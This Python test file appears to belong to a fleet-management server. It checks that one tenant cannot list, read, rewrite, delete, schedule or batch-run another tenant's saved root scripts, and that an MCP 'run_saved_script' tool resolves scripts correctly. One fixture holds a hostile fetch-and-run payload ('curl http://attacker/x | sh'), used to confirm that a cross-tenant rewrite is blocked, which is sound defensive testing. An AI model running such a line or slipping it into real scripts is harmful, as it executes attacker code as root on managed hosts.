#!/usr/bin/env python3
"""The saved-script library was instance-wide, and the MCP tool that runs from
it never worked.

A script body is code the agent runs as root, and in practice it carries
credentials, internal hostnames and API endpoints. The library had no tenant
gate on any of its handlers: `require_auth()` let any role in any tenant list
every script and read every body, and `require_admin_auth()` let any tenant
admin repoint or delete another tenant's script — which is code execution on
that tenant's hosts the next time it runs.

Found in the same read: `_mcp_execute`'s `run_saved_script` did
`load(SCRIPTS_FILE).get(script_id)` against a store shaped
`{'scripts': [...]}`, so one of the five documented MCP write tools has
answered "not found" to every call it has ever received.
"""
import importlib.util
import os
import sys
import tempfile
import unittest
from pathlib import Path

os.environ.setdefault('RP_DATA_DIR', tempfile.mkdtemp(prefix='rp-v702scr-'))
_ROOT = Path(__file__).resolve().parent.parent
_CGI = _ROOT / 'server' / 'cgi-bin'
sys.path.insert(0, str(_CGI))
_spec = importlib.util.spec_from_file_location('api_v702scr', _CGI / 'api.py')
api = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(api)


class _Base(unittest.TestCase):

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix='rp-scr-'))
        self._saved = {n: getattr(api, n) for n in
                       ('SCRIPTS_FILE', 'DEVICES_FILE', 'CMDS_FILE',
                        'USERS_FILE', 'CONFIG_FILE', 'TENANTS_FILE')}
        for n in self._saved:
        # The BASENAME is the storage key. Under SQLite/Postgres the backend
        # selects its table from it, so a synthesised name like
        # 'devices_file.json' is not the devices store — every heartbeat 403'd
        # on the JSON-backend-only spelling. Keep the product's own filename.
            setattr(api, n, self.d / self._saved[n].name)
        self._fns = {n: getattr(api, n) for n in
                     ('respond', 'method', 'get_json_obj', 'get_json_body',
                      'audit_log', 'log_command', 'fire_webhook',
                      'get_token_from_request', 'verify_token', '_tenant_gate',
                      '_tenancy_enforced', '_caller_is_superadmin')}
        self.cap = {}

        def _respond(status, data=None):
            self.cap['status'], self.cap['data'] = status, data
            raise api.HTTPError(status, data)
        api.respond = _respond
        for n in ('audit_log', 'log_command', 'fire_webhook'):
            setattr(api, n, lambda *a, **k: None)
        api.get_token_from_request = lambda: 'tok'
        api._LOAD_CACHE.clear()
        api.save(api.DEVICES_FILE, {'a1': {'name': 'a', 'tenant': 'tenant-a'},
                                    'b1': {'name': 'b', 'tenant': 'tenant-b'}})
        api.save(api.USERS_FILE, {'aadmin': {'tenant_id': 'tenant-a'},
                                  'badmin': {'tenant_id': 'tenant-b'}})
        api.save(api.CONFIG_FILE, {'tenancy_enforced': True})
        # Keyed BY tenant id — a tenant missing from this store resolves to
        # 'default', which quietly turns the fixture's tenant admin into a
        # superadmin and makes every isolation assertion vacuous.
        api.save(api.TENANTS_FILE, {'tenant-a': {'name': 'A', 'status': 'active'},
                                    'tenant-b': {'name': 'B', 'status': 'active'}})
        api._LOAD_CACHE.clear()

    def tearDown(self):
        for n, v in list(self._saved.items()) + list(self._fns.items()):
            setattr(api, n, v)
        api._LOAD_CACHE.clear()

    def _call(self, fn, *a):
        self.cap.clear()
        try:
            return 200, fn(*a)
        except api.HTTPError:
            return self.cap.get('status'), self.cap.get('data')

    def _as(self, tenant, user='badmin', role='admin'):
        api.verify_token = lambda _t=None: (user, role)
        api._tenant_gate = lambda: tenant
        api._tenancy_enforced = lambda: True
        api._caller_is_superadmin = lambda: tenant is None

    def _add(self, tenant, user, name='secret job',
             body='curl -H "Authorization: Bearer s3cr3t" https://internal/x'):
        self._as(tenant, user)
        api.method = lambda: 'POST'
        api.get_json_body = lambda: {'name': name, 'body': body}
        api.get_json_obj = api.get_json_body
        st, d = self._call(api.handle_scripts_add)
        self.assertEqual(st, 201, d)
        return d['script']


class TestOneTenantCannotReachAnothersScripts(_Base):

    def test_the_script_records_its_tenant(self):
        s = self._add('tenant-b', 'badmin')
        self.assertEqual(s['tenant_gate'], 'tenant-b')

    def test_it_is_not_listed(self):
        self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual(rows, [], 'another tenant saw the script')

    def test_the_body_is_not_readable(self):
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'GET'
        st, d = self._call(api.handle_scripts_get, s['id'])
        self.assertEqual(st, 404, 'a script body is a credential store')
        self.assertNotIn('s3cr3t', repr(d))

    def test_a_read_only_role_in_another_tenant_cannot_read_it_either(self):
        """`require_auth()` admits viewer/auditor/mcp, so the disclosure was
        not limited to admins."""
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aviewer', role='viewer')
        api.method = lambda: 'GET'
        st, _d = self._call(api.handle_scripts_get, s['id'])
        self.assertEqual(st, 404)

    def test_it_cannot_be_repointed(self):
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'PUT'
        api.get_json_body = lambda: {'body': 'curl http://attacker/x | sh'}
        api.get_json_obj = api.get_json_body
        st, _d = self._call(api.handle_scripts_update, s['id'])
        self.assertEqual(st, 404, 'another tenant rewrote code that runs as root')
        api._LOAD_CACHE.clear()
        stored = (api.load(api.SCRIPTS_FILE) or {})['scripts'][0]
        self.assertNotIn('attacker', stored['body'])

    def test_it_cannot_be_deleted(self):
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'DELETE'
        st, _d = self._call(api.handle_scripts_delete, s['id'])
        self.assertEqual(st, 404)
        api._LOAD_CACHE.clear()
        self.assertEqual(len((api.load(api.SCRIPTS_FILE) or {})['scripts']), 1)

    def test_it_cannot_be_scheduled(self):
        """The scheduler fires with no request context, so the only place a
        tenant boundary can be enforced for a scheduled script is when the job
        is created."""
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aadmin')
        st, _d = self._call(api._validate_scheduled_command,
                            'script:' + s['id'], 'a1')
        self.assertEqual(st, 404)

    def test_it_cannot_be_batch_executed(self):
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'POST'
        api.get_json_body = lambda: {'script_id': s['id'], 'device_ids': ['a1']}
        api.get_json_obj = api.get_json_body
        st, _d = self._call(api.handle_exec_batch)
        self.assertEqual(st, 404)

    def test_the_owner_is_unaffected(self):
        """Control — a gate that hid the library from everyone would pass every
        assertion above."""
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-b', 'badmin')
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual([r['id'] for r in rows], [s['id']])
        st, d = self._call(api.handle_scripts_get, s['id'])
        self.assertEqual(st, 200)
        self.assertIn('s3cr3t', d['body'])

    def test_a_single_tenant_install_is_unchanged(self):
        """Control — with tenancy off `_tenant_gate()` is None and the filter
        is a no-op, which is every install that does not use tenancy."""
        s = self._add('tenant-b', 'badmin')
        api.verify_token = lambda _t=None: ('alice', 'admin')
        api._tenant_gate = lambda: None
        api._tenancy_enforced = lambda: False
        api._caller_is_superadmin = lambda: False
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual([r['id'] for r in rows], [s['id']])

    def test_the_platform_operator_sees_every_tenant(self):
        self._add('tenant-b', 'badmin')
        self._add('tenant-a', 'aadmin', name='a job')
        self._as(None, 'root')
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual(len(rows), 2)


class TestScriptsWrittenBeforeThisRelease(_Base):

    def _legacy(self, created_by):
        api.save(api.SCRIPTS_FILE, {'scripts': [
            {'id': 'old1', 'name': 'legacy', 'body': 'echo hi',
             'created_by': created_by}]})
        api._LOAD_CACHE.clear()

    def test_the_owner_comes_from_the_recorded_author(self):
        """Not a guess — `created_by` is already in the store, so an existing
        library sorts itself without an operator touching it."""
        self._legacy('badmin')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual(rows, [])
        self._as('tenant-b', 'badmin')
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual(len(rows), 1)

    def test_an_orphan_stays_shared_and_says_so(self):
        """A deleted author leaves no fact to resolve. Hiding it would silently
        break whatever runs it, so it stays visible and is flagged instead."""
        self._legacy('someone-who-left')
        self._as('tenant-a', 'aadmin')
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual(len(rows), 1)
        self.assertTrue(rows[0]['unowned'])

    def test_an_owned_script_is_not_flagged_unowned(self):
        s = self._add('tenant-b', 'badmin')
        self._as('tenant-b', 'badmin')
        api.method = lambda: 'GET'
        _st, rows = self._call(api.handle_scripts_list)
        self.assertEqual(rows[0]['id'], s['id'])
        self.assertFalse(rows[0]['unowned'])


class TestTheMcpToolCanActuallyRunAScript(_Base):

    def test_it_resolves_and_queues(self):
        api.save(api.SCRIPTS_FILE, {'scripts': [
            {'id': 'abc123', 'name': 'restart nginx',
             'body': 'systemctl restart nginx'}]})
        api._LOAD_CACHE.clear()
        api._tenant_gate = lambda: None
        r = api._mcp_execute('run_saved_script', 'a1', {'script_id': 'abc123'},
                             'mcp-token', None, None)
        self.assertTrue(r.get('ok'), r)
        self.assertEqual((api.load(api.CMDS_FILE) or {}).get('a1'),
                         ['exec:systemctl restart nginx'])

    def test_the_pre_validation_resolves_it_too(self):
        """There were TWO copies of the wrong shape. `_mcp_prevalidate` ran
        first and returned 400 "not found in library", so the executor's own
        bug was never even reached — fixing one would have looked like fixing
        nothing."""
        api.save(api.SCRIPTS_FILE, {'scripts': [
            {'id': 'abc123', 'name': 'x', 'body': 'true'}]})
        api._LOAD_CACHE.clear()
        api._tenant_gate = lambda: None
        fn = getattr(api, '_mcp_prevalidate', None) or getattr(
            api, '_mcp_validate_params', None)
        self.assertTrue(fn, 'the MCP pre-validation moved or was renamed')
        self.assertIsNone(fn('run_saved_script', {'script_id': 'abc123'}))
        self.assertIn('not found', fn('run_saved_script', {'script_id': 'nope'}))

    def test_a_missing_id_still_reports_not_found(self):
        """Control: the fix must not make every id resolve."""
        api.save(api.SCRIPTS_FILE, {'scripts': []})
        api._LOAD_CACHE.clear()
        api._tenant_gate = lambda: None
        r = api._mcp_execute('run_saved_script', 'a1', {'script_id': 'nope'},
                             'mcp-token', None, None)
        self.assertFalse(r.get('ok'))
        self.assertEqual((api.load(api.CMDS_FILE) or {}).get('a1'), None)

    def test_the_lookup_is_not_written_as_a_dict_read(self):
        """The shape that shipped dead. One helper owns the read now, so this
        pins that the MCP path goes through it. Pinned over the function, not
        the file: `custom_scripts.json` IS dict-keyed, so the same expression is
        correct three lines away, and the comment explaining the bug quotes the
        bug."""
        sys.path.insert(0, str(Path(__file__).parent))
        import srcpin
        body = srcpin.py_function((_CGI / 'api.py').read_text(), '_mcp_execute')
        code = [ln for ln in body.splitlines()
                if not ln.lstrip().startswith('#')]
        seg = '\n'.join(code)
        self.assertIn('_script_by_id(script_id)', seg)
        self.assertNotIn('scripts.get(script_id)', seg,
                         'scripts.json is a wrapped list, not a dict')


if __name__ == '__main__':
    unittest.main()
